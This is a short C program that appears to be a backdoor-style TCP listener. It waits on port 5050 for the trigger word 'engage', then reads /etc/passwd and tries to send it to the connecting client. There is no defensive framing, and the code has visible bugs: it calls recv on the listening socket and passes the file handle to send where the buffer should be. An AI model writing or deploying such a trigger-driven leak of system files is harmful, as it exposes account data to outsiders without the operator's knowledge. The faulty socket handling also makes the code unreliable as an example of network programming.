#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define MESSEAGE_MAX_LEN 100000
#define PORT 5050

int main(){
    char recvBuff[MESSEAGE_MAX_LEN]={0};
    char sendBuff[MESSEAGE_MAX_LEN]={0};
    int clientFD=0;
    int socket_id=socket(PF_INET,SOCK_STREAM,0);
    if ( socket_id == -1)
    {
        perror("socket failed");
        exit(EXIT_FAILURE);
    }

    struct sockaddr_in serverAddress;
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_port = htons( PORT );
    serverAddress.sin_addr.s_addr=INADDR_ANY;  // use my IP address
    memset(&(serverAddress.sin_zero),'\0',8);//
    int connectBind=bind(socket_id,(struct sockaddr *)& serverAddress , sizeof(serverAddress));
    if(connectBind!=0){
        perror("bind failed");
        exit(0);
    }
    int listenVal = listen(socket_id,2);
    if(listenVal!= 0){
        perror("ilsten failed");
        exit (0);
    }
    struct sockaddr_in their_addr;
    int sin_size = sizeof(struct sockaddr_in);

    int acceptVal=accept(socket_id, (struct sockaddr*)&their_addr,&sin_size);

    int retVal=recv(socket_id,recvBuff,MESSEAGE_MAX_LEN,0);
    if(strncmp(recvBuff,"engage",6)==0){

        FILE* outPutFile=fopen("/etc/passwd","r");
        if(!outPutFile){
            perror("file didnt open");
            exit(0);
        }
        fseek(outPutFile,0L,SEEK_END);//put internal pointer to end of file
        size_t len=ftell(outPutFile);//get file size for buffer loading
        rewind(outPutFile);//return internal pointer to init location(start)
        fread(sendBuff,1,len,outPutFile);//load "/etc/passwd" to sendBuff
        int sendVal=send(acceptVal,outPutFile,strlen(sendBuff),0);//send buff;
        if(sendVal < len || sendVal == -1){
            perror("send failed");
            exit (0);
        }
        close(socket_id);
    }
    return 0;
}
